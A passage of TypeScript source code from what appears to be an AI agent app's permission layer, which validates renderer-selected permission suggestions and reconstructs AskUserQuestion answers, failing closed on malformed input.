    mode: context.mode,
    alwaysAllowRules: cloneRulesBySource(context.alwaysAllowRules),
    alwaysDenyRules: cloneRulesBySource(context.alwaysDenyRules),
    alwaysAskRules: cloneRulesBySource(context.alwaysAskRules),
    ruleMetadata: [
      ...buildRuleMetadata('allow', context.alwaysAllowRules),
      ...buildRuleMetadata('deny', context.alwaysDenyRules),
      ...buildRuleMetadata('ask', context.alwaysAskRules),
    ],
    managedRulesOnly: displayFacts.managedRulesOnly,
    permissionClassifierEnabled: displayFacts.permissionClassifierEnabled,
    additionalWorkingDirectories,
    isBypassPermissionsModeAvailable: context.isBypassPermissionsModeAvailable,
  }
}

function buildRuleMetadata(
  behavior: 'allow' | 'deny' | 'ask',
  rules: ToolPermissionRulesBySource,
): PermissionContextSnapshot['ruleMetadata'] {
  return Object.entries(rules).flatMap(([source, ruleStrings]) =>
    (ruleStrings ?? []).map(rule => {
      const content = permissionRuleValueFromString(rule).ruleContent
      const matchType =
        content === undefined
          ? 'exact'
          : content.endsWith(':*')
            ? 'prefix'
            : content.includes('*')
              ? 'wildcard'
              : 'exact'
      return { behavior, source, rule, matchType }
    }),
  )
}

function cloneRulesBySource(
  rules: ToolPermissionRulesBySource,
): Record<string, string[]> {
  const result: Record<string, string[]> = {}
  for (const [source, ruleStrings] of Object.entries(rules)) {
    if (ruleStrings) {
      result[source] = [...ruleStrings]
    }
  }
  return result
}

type SuggestionSelectionResult =
  | { ok: true; updates: PermissionUpdate[] }
  | { ok: false; reason: string }

/**
 * C1 — validate a renderer "always allow" selection (PERMISSION-BOUNDARY.md).
 * The renderer may request durable permission updates ONLY by selecting, by
 * index, among the `permission_suggestions` the ENGINE minted on this exact
 * pending request. Anything else — a selection on a deny, a non-array, a
 * non-integer / negative / out-of-range index, a duplicate, an oversize list,
 * or a request that minted no suggestions — is rejected fail-closed (error
 * frame, request stays pending). The returned updates are the engine's own
 * objects (the caller clones before use); the renderer never authors rule
 * content, so T6b's guarantee is preserved.
 */
function validateSuggestionSelection(
  rawMessage: unknown,
  behavior: AppPermissionResponse['behavior'],
  request: AppPermissionRequest['request'],
): SuggestionSelectionResult {
  const raw = (
    rawMessage as { response?: { applySuggestions?: unknown } } | null
  )?.response?.applySuggestions
  if (raw === undefined) {
    return { ok: true, updates: [] }
  }
  if (behavior !== 'allow') {
    return { ok: false, reason: 'applySuggestions is only valid on an allow' }
  }
  if (!Array.isArray(raw)) {
    return { ok: false, reason: 'applySuggestions must be an array of indices' }
  }
  if (raw.length === 0) {
    return { ok: true, updates: [] }
  }
  if (raw.length > MAX_SUGGESTION_SELECTIONS) {
    return {
      ok: false,
      reason: `applySuggestions exceeds ${MAX_SUGGESTION_SELECTIONS} entries`,
    }
  }
  // Runtime-narrow the engine-typed field: the request came from the engine,
  // but the boundary stays defensive about shape (same posture as
  // extractGatedToolInput).
  const suggestions = request.permission_suggestions
  if (!Array.isArray(suggestions) || suggestions.length === 0) {
    return {
      ok: false,
      reason: 'request has no permission_suggestions to select from',
    }
  }
  const seen = new Set<number>()
  const updates: PermissionUpdate[] = []
  for (const value of raw) {
    if (
      typeof value !== 'number' ||
      !Number.isInteger(value) ||
      value < 0 ||
      value >= suggestions.length
    ) {
      return {
        ok: false,
        reason: 'applySuggestions contains an invalid or out-of-range index',
      }
    }
    if (seen.has(value)) {
      return { ok: false, reason: 'applySuggestions contains a duplicate index' }
    }
    seen.add(value)
    updates.push(suggestions[value] as PermissionUpdate)
  }
  return { ok: true, updates }
}

/**
 * Pull the tool input the engine actually gated out of the raw permission
 * request, so T6 can compare it against the renderer's `updatedInput`. The
 * request is an `SDKControlPermissionRequest`; the gated tool input lives at
 * `request.input` (mirrors `PermissionPromptTool.inputSchema` — `{ tool_name,
 * input, tool_use_id }`). Returns undefined if the shape is unexpected, in which
 * case T6 falls back to allowing an empty `updatedInput` only.
 */
function extractGatedToolInput(
  request: import('../../src/app-runtime/sessionEvents.js').AppPermissionRequest['request'],
): Record<string, unknown> | undefined {
  const candidate = request as { input?: unknown }
  if (
    candidate.input !== null &&
    typeof candidate.input === 'object' &&
    !Array.isArray(candidate.input)
  ) {
    return candidate.input as Record<string, unknown>
  }
  return undefined
}

type AskUserQuestionReconstructResult =
  | { ok: true; answers: Record<string, string> }
  | { ok: false; reason: string }

/** One engine-minted question, defensively narrowed from the gated input. */
type NarrowedGatedQuestion = {
  question: string
  options: string[] // option labels, in engine order
  multiSelect: boolean
}

/**
 * Narrow the gated AskUserQuestion input's `questions` into the minimal shape
 * the answer reconstruction needs, defensively (the request came from the
 * engine, but the boundary stays defensive about shape — same posture as
 * `extractGatedToolInput`). Returns undefined if the shape is unexpected.
 *
 * Duplicate question TEXT counts as unexpected: the reconstruction below keys
 * the tool's answer map by that text, so two identically-worded questions would
 * pass the arity check, each validate, and then collapse onto one entry — the
 * engine receiving a partially answered tool result while the boundary reported
 * success. `AskUserQuestionTool` allows 1-4 questions with no uniqueness rule,
 * so fail closed here (surfaces as the existing `bad_request`).
 */
function narrowGatedQuestions(
  gatedInput: Record<string, unknown> | undefined,
): NarrowedGatedQuestion[] | undefined {
  const raw = gatedInput?.questions
  if (!Array.isArray(raw)) return undefined
  const questions: NarrowedGatedQuestion[] = []
  const seenQuestions = new Set<string>()
  for (const entry of raw) {
    if (typeof entry !== 'object' || entry === null) return undefined
    const record = entry as Record<string, unknown>
    if (typeof record.question !== 'string') return undefined
    if (seenQuestions.has(record.question)) return undefined
    seenQuestions.add(record.question)
    if (!Array.isArray(record.options)) return undefined
    const options: string[] = []
    for (const option of record.options) {
      if (typeof option !== 'object' || option === null) return undefined
      const label = (option as Record<string, unknown>).label
      if (typeof label !== 'string') return undefined
      options.push(label)
    }
    questions.push({
      question: record.question,
      options,
      multiSelect: record.multiSelect === true,
    })
  }
  return questions
}

/**
 * C5 (P4-20, ASK-USER-QUESTION-ANSWER.md) — reconstruct the tool's
 * `answers: Record<questionText, answerString>` from a renderer answer frame,
 * validated against the ENGINE's own gated questions. Option indices are
 * resolved to the engine's own labels (C1 byte-fidelity); the built-in "Other…"
 * freeform text is the only renderer-authored byte (bounded, model-visible text
 * only). Fail-closed on any structural mismatch; the request stays pending.
 */
function reconstructAskUserQuestionAnswers(
  gatedInput: Record<string, unknown> | undefined,
  answers: AskUserQuestionAnswerMessage['answers'],
): AskUserQuestionReconstructResult {
  const questions = narrowGatedQuestions(gatedInput)
  if (!questions) {
    return { ok: false, reason: 'gated AskUserQuestion input has no questions' }
  }
  if (answers.length !== questions.length) {
    return {
      ok: false,
      reason: 'answers length does not match the questions asked',
    }
  }

  const map: Record<string, string> = {}
  for (let qi = 0; qi < questions.length; qi++) {
    const question = questions[qi]!
    const answer = answers[qi]!
    const other = answer.other?.trim()
    const hasOther = other !== undefined && other.length > 0
    const indices = answer.optionIndices

    // Every index must select a real, distinct engine-minted option.
    const seen = new Set<number>()
    for (const index of indices) {
      if (index >= question.options.length) {
        return {
          ok: false,
          reason: `option index ${index} is out of range for question ${qi}`,
        }
      }
      if (seen.has(index)) {
        return {
          ok: false,
          reason: `duplicate option index ${index} for question ${qi}`,
        }
      }
      seen.add(index)
    }

    const componentCount = indices.length + (hasOther ? 1 : 0)
    if (componentCount === 0) {
      return { ok: false, reason: `question ${qi} has no answer` }
    }
    // Single-select accepts at most one component total (one option OR the
    // freeform), mirroring the tool's own UI cardinality; multi-select joins.
    if (!question.multiSelect && componentCount > 1) {
      return {
        ok: false,
        reason: `question ${qi} is single-select but got multiple answers`,
      }
    }

    // Labels from the ENGINE (index selection), freeform from the bounded wire,
    // joined ", " per the tool's outputSchema (multi answers comma-separated).
    const parts = indices.map(index => question.options[index]!)
    if (hasOther) parts.push(other)
    map[question.question] = parts.join(', ')
  }

  return { ok: true, answers: map }
}

/** Structural deep equality for JSON-shaped values (T6 echo check). */
function deepEqual(a: unknown, b: unknown): boolean {
  if (a === b) return true
  if (typeof a !== typeof b) return false
  if (a === null || b === null) return a === b
  if (typeof a !== 'object') return false

  const aArr = Array.isArray(a)
  const bArr = Array.isArray(b)
  if (aArr !== bArr) return false

  if (aArr && bArr) {
    if (a.length !== b.length) return false
    return a.every((item, i) => deepEqual(item, b[i]))
  }

  const aObj = a as Record<string, unknown>
  const bObj = b as Record<string, unknown>
  const aKeys = Object.keys(aObj)
  const bKeys = Object.keys(bObj)
  if (aKeys.length !== bKeys.length) return false
  return aKeys.every(key => key in bObj && deepEqual(aObj[key], bObj[key]))
}
